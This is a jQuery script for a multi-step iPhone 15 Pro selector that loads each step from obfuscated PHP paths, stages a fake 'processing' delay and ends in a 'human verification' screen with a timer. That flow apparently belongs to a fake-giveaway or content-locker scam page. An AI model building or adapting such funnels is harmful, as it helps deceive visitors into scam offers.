$(document).ready(function() {

    // Models, Colors, Capacity, and Verification Timer
    const models = ["iPhone 15 Pro", "iPhone 15 Pro Max"];
    const colors = ["Natural Titanium", "Blue Titanium", "White Titanium", "Black Titanium"];
    const capacities = ["128 <small>GB²</small>", "256 <small>GB²</small>", "512 <small>GB²</small>", "1 <small>TB²</small>"];
    const humanVerificationTimerValue = '75';

    // Default values
    let selectedModel = models[0];
    let selectedColor = colors[0];
    let selectedCapacity = capacities[0];

    $(document).on("click", ".e-btn", function() {
        processSelection();
    });

    function processSelection() {
        let randomId = Math.random().toString(36).substring(7);
        $('.main-container').append('<div id="' + randomId + '"></div>');

        gS("dp59gksk39g_1", function(src) {
            $('#' + randomId).html(src).hide().fadeIn();
            $.magnificPopup.open({
                items: {
                    src: '#selection-w',
                },
                type: 'inline',
                preloader: false,
                mainClass: 'animated slideInUp',
                modal: true,
                callbacks: {
                    open: function() {
                        attachModelClickHandlers();
                    }
                }
            });
        });
    }

    function attachModelClickHandlers() {
        $('.property-model-iw-i').click(function() {
            updateSelectedModel($(this));
        });

        $(document).on("click", "#button0", function() {
            gS("dp59gksk39g_2", function(src) {
                $('.selection-id').html(src).hide().fadeIn();
                $('.selection-l').addClass('miep');
                attachColorClickHandlers();
            });
        });
    }

    function updateSelectedModel($model) {
        const modelIndex = $model.index();
        const newSrc = "https://dug426tydlk1d.cloudfront.net/md-" + (modelIndex + 1) + ".png";

        $(".selection-l-i").fadeOut(200, function() {
            $(this).attr("src", newSrc).fadeIn(200);
        });

        selectedModel = models[modelIndex];
        $model.addClass('active').siblings().removeClass('active');
    }

    function attachColorClickHandlers() {
        $('.property-cs-iw-i').click(function() {
            updateSelectedColor($(this));
        });

        $(document).on("click", "#button1", function() {
            if (selectedModel === models[0]) {
                gS("dp59gksk39g_3_p", function(src) {
                    $('.property').html(src).hide().fadeIn();
                    $('.cvpw').addClass('mmv');
                    attachCapacityClickHandlers();
                });
            } else {
                gS("dp59gksk39g_3_pm", function(src) {
                    $('.property').html(src).hide().fadeIn();
                    $('.cvpw').addClass('mmv');
                    attachCapacityClickHandlers();
                });
            }
        });
    }

    function updateSelectedColor($color) {
        const colorIndex = $color.index();
        let newSrc;

        selectedColor = colors[colorIndex];
        newSrc = "https://dug426tydlk1d.cloudfront.net/co-" + (colorIndex + 1) + ".png";

        $(".selection-l-i").fadeOut(200, function() {
            $(this).attr("src", newSrc).fadeIn(200);
        });

        $('.finish-current-label span').text(selectedColor);
        $color.addClass('active').siblings().removeClass('active');
    }

    function attachCapacityClickHandlers() {
        $('.cap-m-name').html(selectedModel);
        $('.property-ss-iw-i').click(function() {
            updateSelectedCapacity($(this));
        });

        $(document).on("click", "#button2", function() {
            $('.property-ss h2').hide();
            $('.s3-h').fadeOut(function() {
                $('.s3-s').fadeIn();
                setTimeout(function() {
                    continueProcess();
                }, 3500);
            });
        });
    }

    function updateSelectedCapacity($capacity) {
        selectedCapacity = capacities[$capacity.index()];
        $capacity.addClass('active').siblings().removeClass('active');
    }

    function continueProcess() {
        gS("dp59gksk39g_4", function(src) {
            $('.property').html(src).hide().fadeIn();
            $('.property-hv-overview-v').html(selectedModel + ' ' + selectedColor + ' ' + selectedCapacity);
            //human_verification_timer.init(humanVerificationTimerValue);
        });
    }

    function aO(el, anim, onDone) {
        var $el = $(el);
        $el.addClass('animated ' + anim);
        $el.one('animationend', function() {
            $(this).removeClass('animated ' + anim);
            onDone && onDone();
        });
    }

    function gS(step, onStep) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'dp59gksk39g/' + step + '.php');
        xhr.setRequestHeader("X-REQUESTED-WITH", 'xmlhttprequest');
        xhr.addEventListener('readystatechange', function() {
            if (xhr.readyState == 4) {
                onStep && onStep(xhr.responseText)
            }
        });
        xhr.send()
    }

});
var human_verification_timer = function() {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';

    function countdown() {
        if (time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }

    function add_leading_zero(n) {
        if (n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }

    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);
        seconds = add_leading_zero(seconds);
        minutes = add_leading_zero(minutes);
        hours = add_leading_zero(hours);
        return minutes + ' minutes and ' + seconds + ' seconds';
    }

    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }

    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function() {
            countdown();
            //timer_time_left();
        },
        timer: function() {
            //human_verification_timer.count();
            if (keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                //no_time_left();
            }
        },
        init: function(n) {
            time_left = n;
            //human_verification_timer.timer();
        }
    };
}();